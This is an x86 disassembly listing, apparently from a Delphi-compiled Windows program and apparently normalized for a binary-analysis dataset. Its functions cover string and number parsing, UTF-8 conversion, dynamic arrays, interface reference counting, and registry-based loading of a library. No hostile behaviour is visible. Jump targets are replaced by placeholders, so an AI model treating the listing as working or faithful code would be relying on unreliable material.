pop ecx
sub ecx eax
jle r-xdata
lea edx [ eax + esi ]
add eax ebx
call sub_404b50
mov eax 0x10
jmp r-xdata
cmp cl 0xd
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax + ebx ]
add eax esi
call sub_4029c0
xor ecx ecx
mov cl [ edx + 0x1 ]
push [ ecx + edx + 0x2 ]
push [ ecx + edx + 0x6 ]
mov ecx [ ecx + edx + 0xa ]
mov ecx [ ecx ]
lea edx [ eax + esi ]
add eax ebx
call sub_404c84
pop eax
jmp r-xdata
cmp cl 0xe
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
mov ecx [ ecx + edx + 0x2 ]
push ecx
mov ecx edx
lea edx [ eax + esi ]
add eax ebx
call sub_404b68
pop eax
jmp r-xdata
cmp cl 0xf
je r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_405a20
mov eax 0x4
jmp r-xdata
cmp cl 0x11
je r-xdata
mov ecx edx
mov edx [ eax + esi ]
add eax ebx
call sub_405364
mov eax 0x4
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402920
sub_404c84
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov ebp [ esp + 0x14 ]
mov cl [ edi ]
cmp cl 0xa
je r-xdata
mov eax ebx
mov edx [ esi ]
call sub_403ff8
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xb
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_4046ec
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xc
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
jmp r-xdata
mov eax ebx
mov edx esi
call sub_404b50
add ebx 0x10
add esi 0x10
dec ebp
jne r-xdata
cmp cl 0xd
je r-xdata
jmp r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
lea edi [ ecx + edi + 0x2 ]
cmp cl 0xe
je r-xdata
mov eax ebx
mov edx esi
mov ecx [ edi + 0x8 ]
push [ edi + 0x4 ]
call sub_404c84
add ebx [ edi ]
add esi [ edi ]
dec ebp
jne r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
mov ecx edi
call sub_404b68
xor eax eax
mov al [ edi + 0x1 ]
add ebx [ eax + edi + 0x2 ]
add esi [ eax + edi + 0x2 ]
dec ebp
jne r-xdata
cmp cl 0xf
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_405a20
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
mov ecx edi
call sub_405364
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402920
sub_404da8
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] ebx
mov eax [ esp ]
call sub_40481c
mov edx eax
mov ecx esi
mov eax ebx
call sub_404d9c
pop edx
pop esi
pop ebx
retn
sub_404dcc
push ebx
push ecx
mov ebx eax
xor eax eax
mov [ esp ] eax
mov eax ebx
call sub_404264
mov ecx eax
mov eax esp
mov edx ebx
call sub_404710
mov eax [ esp ]
pop edx
pop ebx
retn
sub_404df8
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_404e1c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] edx
mov esi eax
mov ebp 0x1
xor edi edi
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xc ] 0x0
test esi esi
jne r-xdata
cmp [ esi + ebp - 0x1 ] 0x20
je r-xdata
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
inc ebp
mov [ esp + 0x10 ] 0x0
mov al [ esi + ebp - 0x1 ]
cmp al 0x2d
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
cmp al 0x2b
jne r-xdata
mov [ esp + 0x10 ] 0x1
inc ebp
jmp r-xdata
mov bl 0x1
cmp [ esi + ebp - 0x1 ] 0x24
je r-xdata
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
mov al [ esi + ebp - 0x1 ]
call sub_402a00
cmp al 0x58
je r-xdata
inc ebp
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
mov edi eax
and edi 0xff
sub edi 0x30
jmp r-xdata
add dl 0xf9
sub dl 0x6
jb r-xdata
mov al [ esi + ebp - 0x1 ]
mov edx eax
add dl 0xd0
sub dl 0xa
jae r-xdata
mov al [ esi + ebp ]
call sub_402a00
cmp al 0x58
jne r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov edi eax
and edi 0xff
sub edi 0x37
jmp r-xdata
add dl 0xe6
sub dl 0x6
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
mov edi eax
and edi 0xff
sub edi 0x30
cmp [ esp + 0xc ] 0x0
jne r-xdata
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
mov edi eax
and edi 0xff
sub edi 0x57
jmp r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
cmp [ esp + 0xc ] 0xfffffff
jne r-xdata
jmp r-xdata
je r-xdata
cmp [ esp + 0x8 ] 0x0
cmp [ esp + 0xc ] 0xccccccc
jne r-xdata
jmp r-xdata
cmp [ esi + ebp - 0x1 ] 0x0
setne al
or bl al
je r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jmp r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xffffffff
jbe r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xcccccccc
jbe r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
mov eax edi
cdq
push edx
push eax
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
shld edx eax 0x4
shl eax 0x4
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
setl al
cmp [ esp + 0x8 ] 0x0
setb al
jmp r-xdata
push 0x0
push 0xa
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
call sub_404df8
push edx
push eax
mov eax edi
cdq
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
mov al [ esi + ebp - 0x1 ]
mov edx eax
add dl 0xd0
sub dl 0xa
jb r-xdata
dec ebp
cmp al [ esp + 0x10 ]
je r-xdata
sub_40507c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
jg r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
xor eax eax
mov al [ esi + 0x1 ]
add esi eax
mov eax esi
mov edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x6 ]
test edx edx
je r-xdata
sub ebx 0x4
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
sub ebx 0x4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_405074
jmp r-xdata
mov al 0x4
call sub_402920
xor esi esi
mov esi [ edx ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x1c ] 0x8
test ebx ebx
je r-xdata
mov al 0x4
call sub_402920
mov eax edi
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cdq
idiv edi
cmp eax [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x20 ] ebx
cmp edi [ ebp - 0x10 ]
jge r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_402804
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test esi esi
je r-xdata
dec [ ebx ]
mov eax [ ebp - 0x1c ]
call sub_4027c4
mov ebx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp edi [ ebp - 0x14 ]
jge r-xdata
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] edi
add ebx 0x4
mov edx edi
sub edx [ ebp - 0x10 ]
imul edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
imul eax [ ebp - 0x10 ]
add eax ebx
xor ecx ecx
call sub_402c68
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov eax ebx
add eax 0x8
mov edx edi
imul edx [ ebp - 0x18 ]
add eax edx
mov ecx [ ebp - 0x10 ]
sub ecx edi
mov edx esi
call j_sub_404a58
test esi esi
je r-xdata
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0x18 ]
mov edx ebx
add edx 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4029c0
mov edx [ ebp - 0x14 ]
imul edx [ ebp - 0x18 ]
mov eax ebx
add eax 0x8
xor ecx ecx
call sub_402c68
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax ebx
add eax 0x8
mov ecx esi
call sub_40505c
jmp r-xdata
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
lea eax [ ebx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_40507c
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_405214
push ebx
test eax eax
je r-xdata
mov eax ecx
call sub_405328
pop ebx
retn
mov ebx eax
sub ebx 0x4
mov ebx [ ebx ]
push ebx
push ecx
xor ecx ecx
call sub_405234
pop ebx
retn
sub_405234
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_405074
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
test edi edi
jge r-xdata
mov eax [ ebp - 0x4 ]
sub eax 0x4
mov eax [ eax ]
cmp eax edi
jge r-xdata
add esi edi
xor edi edi
mov edx eax
sub edx edi
cmp esi edx
jle r-xdata
mov edi eax
test esi esi
jge r-xdata
mov esi edx
test esi esi
jle r-xdata
xor esi esi
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x1 ]
add [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x2 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x6 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax esi
imul [ ebp - 0xc ]
add eax 0x8
call sub_4027c4
mov ebx eax
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] esi
add ebx 0x4
imul edi [ ebp - 0xc ]
add [ ebp - 0x4 ] edi
test esi esi
jle r-xdata
mov ecx esi
imul ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4029c0
mov edx esi
imul edx [ ebp - 0xc ]
mov eax ebx
xor ecx ecx
call sub_402c68
push esi
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_40505c
jmp r-xdata
sub_405328
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov [ eax ] 0x0
[ ecx - 0x8 ]
jne r-xdata
push eax
mov eax ecx
xor ecx ecx
mov cl [ edx + 0x1 ]
mov edx [ ecx + edx + 0x6 ]
test edx edx
je r-xdata
sub eax 0x8
call sub_4027e4
pop eax
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov edx [ edx ]
call sub_404a58
sub_405364
push ebx
mov ebx [ eax ]
test edx edx
je r-xdata
test ebx ebx
je r-xdata
[ edx - 0x8 ]
mov [ eax ] edx
pop ebx
retn
[ ebx - 0x8 ]
jne r-xdata
push eax
push edx
mov edx ecx
inc [ ebx - 0x8 ]
call sub_405328
pop edx
pop eax
sub_40538c
add esp 0xffffffe4
push 0x1c
lea edx [ esp + 0x4 ]
push edx
push eax
call sub_4013d4
cmp [ esp + 0x10 ] 0x1000
jne r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
add esp 0x1c
retn
sub_4053bc
push ebx
push esi
add esp 0xfffffef8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
add esp 0x108
pop esi
pop ebx
retn
push 0x105
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call sub_401364
mov eax esp
mov dl 0x1
call sub_4055f8
mov esi eax
mov [ ebx + 0x10 ] esi
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
sub_405404
mov edx [ rw-data ]
test edx edx
je r-xdata
retn
cmp eax [ edx + 0x4 ]
je r-xdata
mov eax edx
call sub_4053bc
retn
cmp eax [ edx + 0x8 ]
je r-xdata
cmp eax [ edx + 0xc ]
jne r-xdata
mov edx [ edx ]
test edx edx
jne r-xdata
sub_405440
push ebp
mov ebp esp
add esp 0xfffffdb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r-xdata
call sub_40136c
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x5c
jne r-xdata
push r-xdata
push esi
call sub_401374
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x5c
jne r-xdata
push 0x105
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x2
call sub_40542c
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
jmp r-xdata
lea eax [ esi + 0x1 ]
call sub_40542c
mov edi eax
mov eax edi
sub eax esi
mov edx eax
add edx ebx
inc edx
cmp edx 0x105
jg r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
lea eax [ esi + 0x1 ]
call sub_40542c
mov esi eax
cmp [ esi ] 0x0
je r-xdata
inc eax
push eax
push esi
lea eax [ ebp - 0x24f ]
add eax ebx
push eax
call lstrcpynA
lea eax [ ebp - 0x14a ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call sub_401344
mov esi eax
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push esi
call sub_40133c
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
lea edx [ ebx + 0x1 ]
add eax edx
inc eax
cmp eax 0x105
jg r-xdata
mov ebx esi
sub ebx [ ebp - 0x4 ]
lea eax [ ebx + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call lstrcpynA
jmp r-xdata
mov [ ebp + ebx - 0x24f ] 0x5c
mov eax 0x105
sub eax ebx
dec eax
push eax
lea eax [ ebp - 0x11e ]
push eax
lea eax [ ebp - 0x24f ]
add eax ebx
inc eax
push eax
call lstrcpynA
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
inc eax
add ebx eax
mov esi edi
sub_4055f8
push ebp
mov ebp esp
add esp 0xfffffee0
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x105
lea eax [ ebp - 0x11d ]
push eax
push 0x0
call sub_401364
mov [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4013bc
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_4056fd
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x18 ] 0x5
lea eax [ ebp - 0x11d ]
mov edx 0x105
call sub_405440
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x11d ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call sub_4013c4
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000002
call sub_4013bc
test eax eax
je r-xdata
mov [ ebp - 0xe ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4013b4
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4013c4
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4013bc
test eax eax
jne r-xdata
mov [ ebp - 0x12 ] 0x0
push 0x105
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x11d ]
push eax
call lstrcpynA
push 0x5
lea eax [ ebp - 0xd ]
push eax
push 0x3
call sub_401384
push eax
call sub_40135c
xor esi esi
cmp [ ebp - 0x11d ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea eax [ ebp - 0x11d ]
push eax
call lstrlenA
mov ebx eax
lea eax [ ebp - 0x11d ]
add ebx eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp [ ebx ] 0x2e
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
jne r-xdata
inc ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
dec ebx
test esi esi
jne r-xdata
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0x12 ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
test esi esi
jne r-xdata
mov [ ebp - 0xb ] 0x0
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
sub_405870
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ rw-data ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4053bc
mov edx edi
call esi
test al al
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
sub_4058cc
push ebx
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edx esi
test edx edx
je r-xdata
mov edx [ esi + 0x4 ]
cmp edx eax
jne r-xdata
pop esi
pop ebx
retn
mov ecx [ edx ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax esi
call sub_4027e4
pop esi
pop ebx
retn
mov edx [ edx ]
test edx edx
jne r-xdata
mov ebx [ ecx + 0x4 ]
cmp ebx eax
jne r-xdata
mov esi ecx
mov eax [ ecx ]
mov [ edx ] eax
mov edx 0x8
mov eax esi
call sub_4027e4
jmp r-xdata
sub_40592c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_405967
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_405998
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_4059fc
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_40592c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405a03
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
jmp r-xdata
retn
mov edx [ eax ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
jmp r-xdata
sub_405a20
test edx edx
je r-xdata
mov ecx [ eax ]
test ecx ecx
mov [ eax ] edx
je r-xdata
push edx
push eax
mov eax [ edx ]
push edx
call [ eax + 0x4 ]
pop eax
mov ecx [ eax ]
pop [ eax ]
test ecx ecx
jne r-xdata
retn
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
retn
retn
sub_405a4c
test edx edx
je sub_405a08
push edi
mov edi eax
push 0x0
push esp
push ecx
push edx
mov eax [ edx ]
call [ eax ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov al 0x17
jmp sub_402920
pop eax
mov [ edi ] eax
pop edi
retn
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_405ab4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403308
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_405af0
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
call InterlockedDecrement
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_405b18
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
xor edx edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax edx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor ecx ecx
test eax eax
je r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x8 ]
movzx edx [ eax + ecx * 2 ]
inc ecx
cmp edx 0x7f
jbe r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
inc esi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
cmp edx 0x7ff
jbe r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
inc esi
inc esi
mov [ eax + esi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x4 ]
dec esi
mov edx [ ebp - 0x8 ]
movzx edx [ edx + ecx * 2 ]
inc ecx
cmp edx 0x7f
ja r-xdata
cmp edx 0x7ff
jbe r-xdata
mov [ eax + esi ] dl
inc esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
lea ebx [ esi + 0x3 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
mov ebx edx
shr ebx 0x6
or bl 0xc0
mov [ eax + esi ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x1 ] dl
add esi 0x2
mov ebx edx
shr ebx 0xc
or bl 0xe0
mov [ eax + esi ] bl
mov ebx edx
shr ebx 0x6
and bl 0x3f
or bl 0x80
mov [ eax + esi + 0x1 ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x2 ] dl
add esi 0x3
jmp r-xdata
sub_405bf4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0xffffffff
xor eax eax
xor esi esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc eax
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
test dl 0x80
je r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
cmp esi [ ebp + 0x8 ]
jb r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
and dl 0x3f
test dl 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov edx [ ebp - 0xc ]
xor ecx ecx
mov cl [ edx + esi ]
inc esi
test cl 0x80
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] cx
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
and ecx 0x3f
test cl 0x20
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
and dl 0x3f
and edx 0xff
shl ecx 0x6
or dx cx
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
and dl 0x3f
and edx 0xff
shl ecx 0x6
or edx ecx
mov ecx edx
sub_405d2c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405dcb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403fa4
mov eax ebx
xor edx edx
call sub_404828
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405dd2
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
mov eax ebx
call sub_40481c
lea edx [ eax + eax * 2 ]
lea eax [ ebp - 0x4 ]
call sub_4045f0
mov eax ebx
call sub_40481c
push eax
mov eax [ ebp - 0x4 ]
call sub_404264
inc eax
push eax
mov eax ebx
call sub_40480c
push eax
